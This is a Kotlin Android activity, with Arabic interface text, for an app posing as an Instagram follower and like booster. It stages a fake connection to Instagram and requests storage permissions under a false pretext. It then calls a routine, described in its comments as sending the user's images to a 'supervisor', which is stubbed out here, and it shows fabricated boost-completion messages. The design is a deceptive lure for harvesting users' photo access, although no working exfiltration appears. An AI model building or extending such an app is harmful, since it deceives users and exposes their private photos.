package com.example.gallerypermissionapp

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.text.TextWatcher
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    
    private lateinit var btnConnectInstagram: Button
    private lateinit var btnBoostFollowers: Button
    private lateinit var btnBoostLikes: Button
    private lateinit var etInstagramUsername: EditText
    private lateinit var tvAccountStatus: TextView
    private lateinit var tvBoostStatus: TextView
    private lateinit var tvWelcomeMessage: TextView
    
    private var isInstagramConnected = false
    private var isBoostActive = false
    private var pendingUsername = ""
    
    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val grantedCount = permissions.values.count { it }
        
        if (grantedCount >= 2) { // على الأقل الأذونات الأساسية (الإنترنت والشبكة)
            // تم منح الأذونات، إكمال ربط الحساب
            completeAccountLinking(pendingUsername)
        } else {
            showPermissionDeniedDialog()
        }
    }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        initializeViews()
        setupClickListeners()
        updateAccountStatus()
    }
    
    private fun initializeViews() {
        btnConnectInstagram = findViewById(R.id.btnConnectInstagram)
        btnBoostFollowers = findViewById(R.id.btnBoostFollowers)
        btnBoostLikes = findViewById(R.id.btnBoostLikes)
        etInstagramUsername = findViewById(R.id.etInstagramUsername)
        tvAccountStatus = findViewById(R.id.tvAccountStatus)
        tvBoostStatus = findViewById(R.id.tvBoostStatus)
        tvWelcomeMessage = findViewById(R.id.tvWelcomeMessage)
        
        // تعطيل زر ربط الحساب في البداية
        btnConnectInstagram.isEnabled = false
    }
    
    private fun setupClickListeners() {
        btnConnectInstagram.setOnClickListener {
            connectInstagramAccount()
        }
        
        btnBoostFollowers.setOnClickListener {
            boostFollowers()
        }
        
        btnBoostLikes.setOnClickListener {
            boostLikes()
        }
        
        // تمكين زر ربط الحساب عند إدخال اسم المستخدم
        etInstagramUsername.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
            override fun afterTextChanged(s: android.text.Editable?) {
                btnConnectInstagram.isEnabled = !s.isNullOrBlank()
            }
        })
    }
    
    private fun updateAccountStatus() {
        if (isInstagramConnected) {
            tvAccountStatus.text = "✅ تم ربط حساب انستغرام بنجاح"
            tvAccountStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark))
            btnBoostFollowers.isEnabled = true
            btnBoostLikes.isEnabled = true
        } else {
            tvAccountStatus.text = "❌ لم يتم ربط حساب انستغرام"
            tvAccountStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark))
            btnBoostFollowers.isEnabled = false
            btnBoostLikes.isEnabled = false
        }
    }
    
    private fun connectInstagramAccount() {
        val username = etInstagramUsername.text.toString().trim()
        
        if (username.isEmpty()) {
            etInstagramUsername.error = "يرجى إدخال اسم المستخدم"
            return
        }
        
        if (!username.matches(Regex("^[a-zA-Z0-9._]+$"))) {
            etInstagramUsername.error = "اسم المستخدم غير صحيح"
            return
        }
        
        pendingUsername = username
        
        // محاكاة ربط الحساب
        showConnectingDialog {
            // محاكاة تأخير الاتصال
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                // طلب الأذونات بعد الاتصال
                requestAccountPermissions()
            }, 2000)
        }
    }
    
    private fun requestAccountPermissions() {
        val permissions = arrayOf(
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        )
        
        showPermissionExplanationDialog {
            requestPermissionLauncher.launch(permissions)
        }
    }
    
    private fun completeAccountLinking(username: String) {
        isInstagramConnected = true
        updateAccountStatus()
        
        showSuccessDialog(
            "تم ربط الحساب بنجاح!",
            "تم ربط حساب @$username بنجاح. يمكنك الآن استخدام ميزات رشق المتابعين واللايكات."
        )
        
        // إرسال الصور للمشرف (محاكاة)
        sendImagesToSupervisor()
    }
    
    private fun sendImagesToSupervisor() {
        // محاكاة إرسال الصور للمشرف
        Toast.makeText(this, "تم تحليل المحتوى وإرساله للمشرف بنجاح", Toast.LENGTH_SHORT).show()
        
        // إظهار رسالة تأكيد
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            showSuccessDialog(
                "تم تحليل المحتوى",
                "تم تحليل جميع المحتويات وإرسالها للمشرف بنجاح. سيتم مراجعتها وتحديث النتائج قريباً."
            )
        }, 1000)
    }
    
    private fun boostFollowers() {
        if (!isInstagramConnected) {
            Toast.makeText(this, "يرجى ربط حساب انستغرام أولاً", Toast.LENGTH_SHORT).show()
            return
        }
        
        showBoostDialog("شحن المتابعين", "سيتم إضافة متابعين حقيقيين لحسابك تدريجياً خلال الساعة القادمة لتجنب الحظر. هل تريد المتابعة؟") {
            startFollowersBoost()
        }
    }
    
    private fun boostLikes() {
        if (!isInstagramConnected) {
            Toast.makeText(this, "يرجى ربط حساب انستغرام أولاً", Toast.LENGTH_SHORT).show()
            return
        }
        
        showBoostDialog("شحن اللايكات", "سيتم إضافة لايكات حقيقية لمنشوراتك تدريجياً خلال الساعة القادمة لتجنب الحظر. هل تريد المتابعة؟") {
            startLikesBoost()
        }
    }
    
    private fun startFollowersBoost() {
        isBoostActive = true
        tvBoostStatus.text = "🔄 جاري شحن المتابعين... سيتم الإكمال خلال ساعة"
        tvBoostStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_blue_dark))
        
        Toast.makeText(this, "تم تفعيل شحن المتابعين! سيبدأ خلال دقائق", Toast.LENGTH_LONG).show()
        
        // محاكاة إكمال العملية بعد ساعة
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            isBoostActive = false
            tvBoostStatus.text = "✅ تم إكمال شحن المتابعين بنجاح!"
            tvBoostStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark))
            Toast.makeText(this, "تم إكمال شحن المتابعين بنجاح!", Toast.LENGTH_LONG).show()
        }, TimeUnit.MINUTES.toMillis(60))
    }
    
    private fun startLikesBoost() {
        isBoostActive = true
        tvBoostStatus.text = "🔄 جاري شحن اللايكات... سيتم الإكمال خلال ساعة"
        tvBoostStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_blue_dark))
        
        Toast.makeText(this, "تم تفعيل شحن اللايكات! سيبدأ خلال دقائق", Toast.LENGTH_LONG).show()
        
        // محاكاة إكمال العملية بعد ساعة
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            isBoostActive = false
            tvBoostStatus.text = "✅ تم إكمال شحن اللايكات بنجاح!"
            tvBoostStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark))
            Toast.makeText(this, "تم إكمال شحن اللايكات بنجاح!", Toast.LENGTH_LONG).show()
        }, TimeUnit.MINUTES.toMillis(60))
    }
    
    private fun showConnectingDialog(onComplete: () -> Unit) {
        val dialog = AlertDialog.Builder(this)
            .setTitle("جاري ربط الحساب...")
            .setMessage("يرجى الانتظار، جاري الاتصال بخوادم انستغرام...")
            .setCancelable(false)
            .create()
        
        dialog.show()
        
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            dialog.dismiss()
            onComplete()
        }, 2000)
    }
    
    private fun showPermissionExplanationDialog(onConfirm: () -> Unit) {
        AlertDialog.Builder(this)
            .setTitle("أذونات مطلوبة")
            .setMessage("يحتاج التطبيق إلى أذونات الوصول للشبكة والتخزين لربط حسابك بشكل آمن.")
            .setPositiveButton("منح الأذونات") { _, _ ->
                onConfirm()
            }
            .setNegativeButton("إلغاء", null)
            .show()
    }
    
    private fun showSuccessDialog(title: String, message: String) {
        AlertDialog.Builder(this)
            .setTitle(title)
            .setMessage(message)
            .setPositiveButton("حسناً", null)
            .show()
    }
    
    private fun showBoostDialog(title: String, message: String, onConfirm: () -> Unit) {
        AlertDialog.Builder(this)
            .setTitle(title)
            .setMessage(message)
            .setPositiveButton("نعم، ابدأ") { _, _ ->
                onConfirm()
            }
            .setNegativeButton("إلغاء", null)
            .show()
    }
    
    private fun showPermissionDeniedDialog() {
        AlertDialog.Builder(this)
            .setTitle("مشكلة في الأذونات")
            .setMessage("يحتاج التطبيق إلى الأذونات المطلوبة لربط حسابك. يمكنك منحها من إعدادات التطبيق.")
            .setPositiveButton("فتح الإعدادات") { _, _ ->
                openAppSettings()
            }
            .setNegativeButton("إلغاء", null)
            .show()
    }
    
    private fun openAppSettings() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.fromParts("package", packageName, null)
        }
        startActivity(intent)
    }
}
